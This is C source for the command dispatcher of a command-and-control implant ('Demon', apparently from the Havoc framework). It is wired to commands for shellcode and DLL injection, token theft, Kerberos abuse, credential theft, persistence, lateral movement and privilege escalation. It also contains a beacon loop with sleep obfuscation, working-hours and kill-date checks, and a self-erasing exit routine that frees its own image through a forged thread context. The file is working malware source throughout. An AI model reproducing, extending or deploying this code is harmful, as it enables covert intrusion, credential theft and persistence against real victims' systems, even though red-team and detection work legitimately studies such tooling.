#include <Demon.h>

#include <common/Macros.h>

#include <core/Command.h>
#include <core/Token.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/SleepObf.h>
#include <core/Download.h>
#include <core/Dotnet.h>
#include <core/Kerberos.h>
#include <core/Runtime.h>
#include <core/CoffeeLdr.h>
#include <core/MemoryHide.h>
#include <inject/Inject.h>

/* [HVC-032] per-group split command files */
#include <commands/Command_FS.h>
#include <commands/Command_Proc.h>
#include <commands/Command_Token.h>
#include <commands/Command_Inject.h>
#include <commands/Command_Net.h>
#include <commands/Command_Config.h>
#include <commands/Command_Lateral.h>
#include <commands/Command_Persist.h>
#include <commands/Command_Creds.h>
#include <commands/Command_Privesc.h>
#include <commands/Command_Pivot.h>

SEC_DATA DEMON_COMMAND DemonCommands[] = {
        { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
        { .ID = DEMON_COMMAND_CHECKIN,                  .Function = CommandCheckin                  },
        { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
        { .ID = DEMON_COMMAND_PROC,                     .Function = CommandProc                     },
        { .ID = DEMON_COMMAND_PROC_LIST,                .Function = CommandProcList                 },
        { .ID = DEMON_COMMAND_FS,                       .Function = CommandFS                       },
        { .ID = DEMON_COMMAND_INLINE_EXECUTE,           .Function = CommandInlineExecute            },
        { .ID = DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE,  .Function = CommandAssemblyInlineExecute    },
        { .ID = DEMON_COMMAND_ASSEMBLY_VERSIONS,        .Function = CommandAssemblyListVersion      },
        { .ID = DEMON_COMMAND_CONFIG,                   .Function = CommandConfig                   },
        { .ID = DEMON_COMMAND_SCREENSHOT,               .Function = CommandScreenshot               },
        { .ID = DEMON_COMMAND_PIVOT,                    .Function = CommandPivot                    },
        { .ID = DEMON_COMMAND_NET,                      .Function = CommandNet                      },
        { .ID = DEMON_COMMAND_INJECT_DLL,               .Function = CommandInjectDLL                },
        { .ID = DEMON_COMMAND_INJECT_SHELLCODE,         .Function = CommandInjectShellcode          },
        { .ID = DEMON_COMMAND_SPAWN_DLL,                .Function = CommandSpawnDLL                 },
        { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
        { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
        { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
        { .ID = DEMON_COMMAND_KERBEROS,                 .Function = CommandKerberos                 },
        { .ID = DEMON_COMMAND_MEM_FILE,                 .Function = CommandMemFile                  },

        /* [HVC-032] new command groups */
        { .ID = DEMON_COMMAND_LATERAL,                  .Function = CommandLateral                  },
        { .ID = DEMON_COMMAND_PERSIST,                  .Function = CommandPersist                  },
        { .ID = DEMON_COMMAND_CREDS,                    .Function = CommandCreds                    },
        { .ID = DEMON_COMMAND_PRIVESC,                  .Function = CommandPrivesc                  },

        { .ID = DEMON_EXIT,                             .Function = CommandExit                     },

        // End
        { .ID = 0, .Function = NULL }
};

//
// TODO: rewrite this part
//       and move it into the Demon.c file
//
VOID CommandDispatcher( VOID )
{
    PARSER   Parser         = { 0 };
    LPVOID   DataBuffer     = { 0 };
    SIZE_T   DataBufferSize = { 0 };
    PARSER   TaskParser     = { 0 };
    LPVOID   TaskBuffer     = { 0 };
    UINT32   TaskBufferSize = { 0 };
    UINT32   CommandID      = { 0 };
    UINT32   RequestID      = { 0 };
    UINT32   CycleNum       = 0;

    PRINTF( "Session ID => %x\n", Instance->Session.AgentID );

    do {
        CycleNum++;
        PUTS( "============================================================" )
        PRINTF( "===== SLEEP CYCLE %u START | Sleep=%dms Jitter=%d%% Technique=%d ProxyLoad=%d AmsiEtw=%d StackSpoof=%d =====\n",
                CycleNum,
                Instance->Config.Sleeping,
                Instance->Config.Jitter,
                Instance->Config.Implant.SleepMaskTechnique,
                Instance->Config.Implant.ProxyLoading,
                Instance->Config.Implant.AmsiEtwPatch,
                Instance->Config.Implant.StackSpoof )
        PUTS( "============================================================" )

        if ( ! Instance->Session.Connected ) {
            PUTS( "CommandDispatcher: session disconnected, exiting loop" )
            break;
        }

        SleepObf();

        if ( ReachedKillDate() ) {
            KillDate();
        }

        // simply call SleepObf until we reach working hours or the kill date (if set)
        if ( ! InWorkingHours() ) {
            continue;
        }

#ifdef TRANSPORT_HTTP
        /* [BUGFIX-004 2026-03-29] Separate failure detection from the HostCheckup.
         * Previously, a failed PackageTransmitAll (network error, server error, etc.)
         * left DataBuffer=NULL and DataBufferSize stale, always triggering the
         * else { break } path below and permanently killing the beacon.  Instead,
         * retry after the next sleep cycle unless all known hosts are exhausted. */
        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) )
        {
            if ( ! HostCheckup() )
            {
                CommandExit( NULL );
            }
            /* Transient error - reset state and retry after next SleepObf. */
            DataBuffer     = NULL;
            DataBufferSize = 0;
            continue;
        }

/* DNS */
#elif defined(TRANSPORT_DNS)
        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) )
        {
            DataBuffer     = NULL;
            DataBufferSize = 0;
            continue;
        }

/* SMB */
#else
        // send all the packages we might have
        PackageTransmitAll( NULL, NULL );

        // read from pipe to receive new tasks
        if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
        {
            PUTS( "SMBGetJob failed" )
            continue;
        }
#endif

        if ( DataBuffer && DataBufferSize > 0 ) {
            ParserNew( &Parser, DataBuffer, DataBufferSize );
            do {
                CommandID  = ParserGetInt32( &Parser );
                RequestID  = ParserGetInt32( &Parser );
                TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );

                Instance->CurrentRequestID = RequestID;

                if ( CommandID != DEMON_COMMAND_NO_JOB ) {
                    PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
                    if ( TaskBufferSize != 0 ) {
                        ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                        ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
                    }

                    for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ ) {
                        if ( DemonCommands[ FunctionCounter ].Function == NULL ) {
                            break;
                        }

                        if ( DemonCommands[ FunctionCounter ].ID == CommandID ) {
                            DemonCommands[ FunctionCounter ].Function( &TaskParser );
                            break;
                        }
                    }
                }
            } while ( Parser.Length > 12 );

            MemSet( DataBuffer, 0, DataBufferSize );
            Instance->Win32.LocalFree( DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );
            ParserDestroy( &TaskParser );
        }
        else
        {
#ifdef TRANSPORT_HTTP
            /* [BUGFIX-004 2026-03-29] PackageTransmitAll returned TRUE but the
             * server response is empty (HTTP 200 with no body, or Base64Decode
             * of an empty response returned size=0).  Free any 1-byte placeholder
             * allocation from Base64Decode and retry after the next sleep cycle
             * instead of permanently killing the beacon. */
            PUTS( "Server returned empty response - retrying after sleep" )
            if ( DataBuffer ) {
                Instance->Win32.LocalFree( DataBuffer );
                DataBuffer = NULL;
            }
            DataBufferSize = 0;
            continue;
#endif
        }

        /* Check if there is something that a process output is available or check if the jobs are still alive. */
        JobCheckList();

        /* Check if we have something in our Pivots connection and sends back the output from the pipes */
        PivotPush();

        /* push any download chunks we have. */
        DownloadPush();

        /* push any dotnet output we have. */
        DotnetPush();

        /* push any new clients or output from the sockets */
        SocketPush();

        PRINTF( "===== SLEEP CYCLE %u END =====\n\n", CycleNum )
    } while ( TRUE );

    Instance->Session.Connected = FALSE;

    PUTS( "Out of while loop" )
}

VOID CommandCheckin( PPARSER Parser )
{
    PUTS( "Checkin" )

    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CHECKIN );

    DemonMetaData( &Package, FALSE );

    PackageTransmit( Package );
}

BOOL InWorkingHours( )
{
    SYSTEMTIME SystemTime   = { 0 };
    UINT32     WorkingHours = Instance->Config.Transport.WorkingHours;
    WORD       StartHour    = 0;
    WORD       StartMinute  = 0;
    WORD       EndHour      = 0;
    WORD       EndMinute    = 0;

    // if WorkingHours is not set, return TRUE
    if ( ( ( WorkingHours >> 22 ) & 1 ) == 0 )
        return TRUE;

    StartHour   = ( WorkingHours >> 17 ) & 0b011111;
    StartMinute = ( WorkingHours >> 11 ) & 0b111111;
    EndHour     = ( WorkingHours >>  6 ) & 0b011111;
    EndMinute   = ( WorkingHours >>  0 ) & 0b111111;

    Instance->Win32.GetLocalTime(&SystemTime);

    if ( SystemTime.wHour < StartHour || SystemTime.wHour > EndHour )
        return FALSE;

    if ( SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute )
        return FALSE;

    if ( SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute )
        return FALSE;

    return TRUE;
}

BOOL ReachedKillDate()
{
    return Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate;
}

VOID KillDate( )
{
    PUTS( "Reached KillDate"  )

    /* Send our last message to our server...
     * "They say time is the fire in which we burn.
     * Right now, Captain, my time is running out." */
    PPACKAGE Package = PackageCreate( DEMON_KILL_DATE );
    PackageTransmit( Package );
    PackageTransmitAll( NULL, NULL );

    CommandExit( NULL );
}

// TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
VOID CommandExit( PPARSER Parser )
{
    PUTS( "Exit" );

    /* default is 1 == exit thread.
     * TODO: make an config that holds the default exit method */
    UINT32            ExitMethod    = 1;
    PPACKAGE          Package       = NULL;
    CONTEXT           RopExit       = { 0 };
    LPVOID            ImageBase     = NULL;
    SIZE_T            ImageSize     = 0;
    PJOB_DATA         JobList       = Instance->Jobs;
    DWORD             JobID         = 0;
    PSOCKET_DATA      SocketList    = Instance->Sockets;
    PSOCKET_DATA      SocketEntry   = NULL;
    PDOWNLOAD_DATA    DownloadList  = Instance->Downloads;
    PDOWNLOAD_DATA    DownloadEntry = NULL;
    PMEM_FILE         MemFileList   = Instance->MemFiles;
    PMEM_FILE         MemFileEntry  = NULL;
    PPIVOT_DATA       SmbPivotList  = Instance->SmbPivots;
    PPIVOT_DATA       SmbPivotEntry = NULL;
    PCOFFEE_KEY_VALUE KeyValueList  = Instance->CoffeKeyValueStore;
    PCOFFEE_KEY_VALUE KeyValueEntry = NULL;

    if ( Parser )
    {
        /* Send our last message to our server...
         * "My battery is low, and it's getting dark." */
        Package    = PackageCreate( DEMON_EXIT );
        ExitMethod = ParserGetInt32( Parser );

        PackageAddInt32( Package, ExitMethod );
        PackageTransmit( Package );
        PackageTransmitAll( NULL, NULL );
    }

    // kill all running jobs
    for ( ;; )
    {
        if ( ! JobList )
            break;

        JobID = JobList->JobID;
        JobList = JobList->Next;

        JobKill( JobID );
    }

    // close all sockets
    for ( ;; )
    {
        if ( ! SocketList )
            break;

        SocketEntry = SocketList;
        SocketList = SocketList->Next;

        if ( SocketEntry->Socket )
        {
            Instance->Win32.closesocket( SocketEntry->Socket );
            SocketEntry->Socket = 0;
        }

        MemSet( SocketEntry, 0, sizeof( SOCKET_DATA ) );
        MmHeapFree( SocketEntry );
    }

    // remove downloads
    for ( ;; )
    {
        if ( ! DownloadList ) {
            break;
        }

        DownloadEntry = DownloadList;
        DownloadList = DownloadList->Next;

        DownloadRemove( DownloadEntry->FileID );
    }

    for ( ;; )
    {
        if ( ! MemFileList ) {
            break;
        }

        MemFileEntry = MemFileList;
        MemFileList = MemFileList->Next;

        RemoveMemFile( MemFileEntry->ID );
    }

    // free the DownloadChunk buffer
    if ( Instance->DownloadChunk.Buffer )
    {
        MmHeapFree( Instance->DownloadChunk.Buffer );
        Instance->DownloadChunk.Buffer = NULL;
        Instance->DownloadChunk.Length = 0;
    }

#ifdef TRANSPORT_HTTP
    DATA_FREE( Instance->ProxyForUrl, Instance->SizeOfProxyForUrl );
#endif

    // disconnect from all smb pivots
    for ( ;; )
    {
        if ( ! SmbPivotList ) {
            break;
        }

        SmbPivotEntry = SmbPivotList;
        SmbPivotList  = SmbPivotList->Next;

        PivotRemove( SmbPivotEntry->DemonID );
    }

    // free all key/values from COFFs
    for ( ;; )
    {
        if ( ! KeyValueList ) {
            break;
        }

        KeyValueEntry = KeyValueList;
        KeyValueList  = KeyValueList->Next;

        DATA_FREE( KeyValueEntry, sizeof( COFFEE_KEY_VALUE ) );
    }

    // stop impersonating
    TokenImpersonate( FALSE );

    // clear all stolen tokens
    TokenClear();

    // terminate the use of the Winsock 2 DLL (Ws2_32.dll)
    if ( Instance->WSAWasInitialised ) {
        Instance->Win32.WSACleanup();
    }

#if TRANSPORT_HTTP
    // close the HTTP session
    if ( Instance->hHttpSession ) {
        Instance->Win32.WinHttpCloseHandle( Instance->hHttpSession );
    }
#endif

#if _WIN64

    /* NOTE:
     *      Credit goes to Austin (@ilove2pwn_) for sharing this code with me.
     * TODO:
     *      Clear memory by using a gadgets that prepares and executes movsb
     */

    ImageBase = Instance->Session.ModuleBase;
    ImageSize = 0;

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance->Win32.RtlCaptureContext( &RopExit );

    RopExit.Rip = U_PTR( Instance->Win32.NtFreeVirtualMemory );
    RopExit.Rsp = U_PTR( ( RopExit.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
    RopExit.Rcx = U_PTR( NtCurrentProcess() );
    RopExit.Rdx = U_PTR( &ImageBase );
    RopExit.R8  = U_PTR( &ImageSize );
    RopExit.R9  = U_PTR( MEM_RELEASE );

    if ( ExitMethod == 1 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.RtlExitUserThread );

    else if ( ExitMethod == 2 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.RtlExitUserProcess );

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance->Win32.NtContinue( &RopExit, FALSE );

#else

    // TODO: cleanup memory

    if ( ExitMethod == 1 )
        Instance->Win32.RtlExitUserThread( STATUS_SUCCESS );

    else if ( ExitMethod == 2 )
        Instance->Win32.RtlExitUserProcess( STATUS_SUCCESS );

#endif
}
